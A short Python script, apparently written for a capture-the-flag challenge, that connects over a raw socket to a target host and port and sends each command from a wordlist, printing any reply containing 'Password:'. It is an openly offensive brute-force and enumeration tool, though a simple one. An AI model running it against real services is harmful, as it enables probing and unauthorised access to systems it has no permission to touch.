import socket
import argparse

# Function to read commands from the endpoint dictionary file
def load_commands_from_file(file_path):
    try:
        with open(file_path, 'r') as f:
            commands = [line.strip() for line in f.readlines()]
        return commands
    except Exception as e:
        print(f"Error reading endpoint dictionary file: {e}")
        return []

# Function to connect via socket and send commands
def brute_force_commands(host, port, commands):
    for command in commands:
        try:
            # Create a socket object
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Connect to the target host and port
            client.connect((host, port))
            
            # Send the command
            client.sendall(command.encode() + b"\n")
            
            # Receive the response from the server
            response = client.recv(4096).decode()
            
            # Only print responses that contain "Password:"
            if "Password:" in response:
                print(f"Command: {command} -> Response: {response.strip()}")
            
            # Close the socket
            client.close()
        
        except Exception as e:
            print(f"Failed to connect or send command {command}: {e}")

# Main function to parse arguments and run brute force
def main():
    # Argument parser for command-line options
    parser = argparse.ArgumentParser(description="Socket brute-force tool for CTF shell.")
    parser.add_argument("-l", "--host", type=str, required=True, help="Target host IP address.")
    parser.add_argument("-p", "--port", type=int, default=8000, help="Target port (default: 8000).")
    parser.add_argument("-e", "--endpoint", type=str, required=True, help="Path to the endpoint dictionary file.")
    
    args = parser.parse_args()

    # Load commands from the endpoint dictionary file
    commands = load_commands_from_file(args.endpoint)
    
    if commands:
        print(f"Loaded {len(commands)} commands from {args.endpoint}")
        # Start brute force attack
        brute_force_commands(args.host, args.port, commands)
    else:
        print("No commands to brute-force.")

if __name__ == "__main__":
    main()
